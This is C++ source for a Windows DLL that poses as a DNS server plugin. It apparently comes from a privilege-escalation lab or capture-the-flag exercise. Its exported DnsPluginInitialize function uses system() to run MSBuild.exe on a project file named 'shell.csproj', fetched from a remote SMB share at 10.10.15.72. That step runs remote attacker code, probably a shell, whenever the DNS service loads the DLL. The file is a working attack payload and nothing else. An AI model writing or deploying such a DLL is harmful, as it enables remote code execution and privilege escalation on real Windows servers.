// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "stdlib.h"
#define EXTERN_DLL_EXPORT extern "C" __declspec(dllexport)

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


EXTERN_DLL_EXPORT int DnsPluginInitialize(PVOID a1, PVOID a2)
{
    system("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe \\\\10.10.15.72\\ica\\shell.csproj");
    return 0;
}

EXTERN_DLL_EXPORT int DnsPluginCleanup()
{
    return 0;
}

EXTERN_DLL_EXPORT int DnsPluginQuery(PVOID a1, PVOID a2, PVOID a3, PVOID* a4)
{
    return 0;
}